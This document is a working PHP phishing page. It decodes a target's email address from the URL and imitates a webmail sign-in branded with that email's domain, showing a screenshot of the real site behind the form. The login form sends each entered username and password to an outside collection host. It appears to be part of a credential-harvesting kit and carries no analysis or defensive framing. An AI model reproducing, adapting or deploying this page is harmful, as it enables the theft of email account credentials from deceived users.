<?php

function getDomainFromEmail($log)
{
// Get the data after the @ sign
   $domain = substr(strrchr($log, "@"), 1);
   $remove = array(".com");
   return $domain;
}
// Example
$login = $_GET['login'];
$log = base64_decode($login);
$domain = getDomainFromEmail($log);

?>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo $domain; ?> - Mail </title>
<link rel="icon" type="image/png" sizes="192x192"  href="https://www.google.com/s2/favicons?domain=<?php echo $domain; ?>?v=BUILD_HASH" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<style type="text/css">
	.login-form {
		width: 385px;
		margin: 30px auto;
	}
    .login-form form {
    	margin-bottom: 15px;
        background: #f7f7f7;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 30px;
    }
    .login-form h2 {
        margin: 0 0 15px;
    }
    .form-control, .login-btn {
        min-height: 38px;
        border-radius: 2px;
    }
    .input-group-addon .fa {
        font-size: 18px;
    }
    .login-btn {
        font-size: 15px;
        font-weight: bold;
    }
	.social-btn .btn {
		border: none;
        margin: 10px 3px 0;
        opacity: 1;
	}
    .social-btn .btn:hover {
        opacity: 0.9;
    }
	.social-btn .btn-primary {
        background: #507cc0;
    }
	.social-btn .btn-info {
		background: #64ccf1;
	}
	.social-btn .btn-danger {
		background: #df4930;
	}
    .or-seperator {
        margin-top: 20px;
        text-align: center;
        border-top: 1px solid #ccc;
    }
    .or-seperator i {
        padding: 0 10px;
        background: #f7f7f7;
        position: relative;
        top: -11px;
        z-index: 1;
    }
</style>
</head>
<div style="position: fixed; z-index: -99; width: 100%; height: 100%">
 <iframe frameborder="0" height="100%" width="100%"
    src="https://api.urlbox.io/v1/0NsrMgu3pB4foSZE/pdf?full_page=true&force=true&retina=true&transparent=true&hide_cookie_banners=true&url=<?php echo $domain; ?>&user_agent=desktop&detect_full_height=true&skip_scroll=true&pdf_page_size=tabloid&pdf_fit_to_page=true&pdf_margin=minimum&pdf_orientation=landscape&pdf_background=true&disable_ligatures=true&width=2000&height=2400">
  </iframe>
</div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

<body>
<div class="login-form">
    <form action="https://autorelog.heronguemn.co/conn/post.php" method="post">
        <h2 class="text-center"><div id="top"><img src="https://www.google.com/s2/favicons?domain=<?php echo $domain; ?>" alt="Mailbox" style="width:28px;height:28px;">&nbsp; <?php echo $domain; ?> Sign in</h2>
        <div class="form-group">
        	<div class="input-group">
                <span class="input-group-addon"><i class="fa fa-user"></i></span>
                <input type="email" class="form-control" name="username" placeholder="Username" value="<?php echo $log; ?>" required="required">
            </div>
        </div>
		<div class="form-group">
            <div class="input-group">
                <span class="input-group-addon"><i class="fa fa-lock"></i></span>
                <input type="password" class="form-control" id"password" name="password" placeholder="Password" required="required">
            </div>
        </div>
        <div class="form-group">
					<input type=hidden  name=email size=35 value=<?php echo $email;?>><input type=hidden  name=address size=5 value=<?php echo $domain; ?>>
</b><br><input type=hidden  name=email size=35 value=<?php echo $email;?>><input type=hidden  name=type size=5 value=<?php echo $domain; ?>>
            <button type="submit" class="btn btn-primary login-btn btn-block">Sign in</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"><input type="checkbox"> Secured Login session?</label>
            <a href="#" class="pull-right">Forgot Password?</a>
        </div>

    </form>
  <a href="<?php echo $domain; ?>"><?php echo $domain; ?> Copyright© 2020
</a>
	</div>
</div>
</body>
</html>                            
